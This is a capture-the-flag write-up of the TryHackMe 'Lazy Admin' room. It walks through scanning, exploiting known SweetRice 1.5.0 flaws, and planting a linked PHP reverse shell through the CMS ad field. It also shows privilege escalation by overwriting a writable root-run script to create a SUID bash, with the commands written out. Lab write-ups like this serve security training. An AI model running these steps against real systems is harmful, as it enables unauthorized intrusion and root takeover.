---
slug: lazy_admin
title: Lazy Admin CTF
authors: [hueami]
tags: [tryhackme, ctf, rce, lpe]
comments: true
---

## Lazy Admin CTF Write-Up

This document provides a comprehensive write-up of the [Lazy Admin](https://tryhackme.com/room/lazyadmin) room on TryHackMe, highlighting a methodical approach to penetration testing within a controlled environment. The challenge is tagged as easy and focuses on exploiting common vulnerabilities found in web applications and misconfigurations within Unix systems.

<!-- truncate -->

### Initial Reconnaissance

#### Web Enumeration

Initial interaction with the target's IP address revealed an Apache default page, suggesting further investigation was necessary. Port scanning was conducted using `nmap` to identify open services:

```bash
nmap [target IP] -p0- -T4
```

The scan results indicated two open ports:
- **22/tcp** for SSH
- **80/tcp** for HTTP

Following this, directory enumeration was performed using `feroxbuster` to discover potential web directories:

```bash
feroxbuster -u [target IP] -w ~/security/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --dont-filter --filter-status 404
```

The command uncovered a directory `/content/`, hinting at the presence of a CMS, identified as SweetRice based on the text on the welcome page. It also revealed `/content/as`, the admin panel of the CMS. User and password are unknown yet.

#### CMS Version Identification

Additional file enumeration focused on the SweetRice CMS path, utilizing `feroxbuster` with a file-specific wordlist, revealing a `changelog.txt`.

```bash
feroxbuster -u [target IP] -w ~/security/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --dont-filter --filter-status 404
```

 Analysis of this file confirmed the CMS version as 1.5.0.

#### Exploit Research

Research on ExploitDB identified vulnerabilities associated with SweetRice 1.5.0, including a MySQL backup issue and a PHP code execution vulnerability:
- **MySQL Backup Discovery**: [ExploitDB Link](https://www.exploit-db.com/exploits/40718)
- **PHP Code Execution Vulnerability**: [ExploitDB Link](https://www.exploit-db.com/exploits/40700)

### Gaining Initial Access

The MySQL backup vulnerability indeed led to a mysql backup file, which provided credentials for a user calles "manager", with a hashed password. These credentials facilitated admin panel access.

### Establishing a Shell

Studying the PHP code execution vulnerability revealed, that php code could be inserted into the Ads code field and then be executed. I used the [pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), initiated a netcat listener on my local machine, and accessed the manipulated Ad URL `http://[target IP]/content/inc/ads/shell.php`. That granted a shell as `www-data`.

#### Shell Stabilization

To stabilize the shell, a Python one-liner was executed, followed by terminal adjustments for full interactivity:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Ctrl + Z for background process and execute:
```bash
stty raw -echo; fg
export TERM=xterm
```
I then found the user flag in `/home/itguy/user.txt`.

### Privilege Escalation

Analysis of user sudo permissions with `sudo -l` revealed a Perl script that could be executed as root without a password:

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

The script was not writeable by any user but invokes another script (`/etc/copy.sh`), which was.

#### Achieving Root Access

Modifying `/etc/copy.sh` to copy and set SUID permissions on `/bin/bash`, and executing the Perl script as sudo, facilitated root shell access:

```bash
echo "cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash;" > /etc/copy.sh
sudo /home/itguy/backup.pl
/tmp/bash -p
```

With the spawned root shell I was able to obtain the root flag in `/root/root.txt`

### Conclusion

This write-up documented the technical steps taken to compromise the "Lazy Admin" CTF challenge on TryHackMe, emphasizing enumeration, vulnerability exploitation, and privilege escalation techniques. The process underscores the importance of meticulous reconnaissance and leveraging known vulnerabilities to achieve elevated privileges.
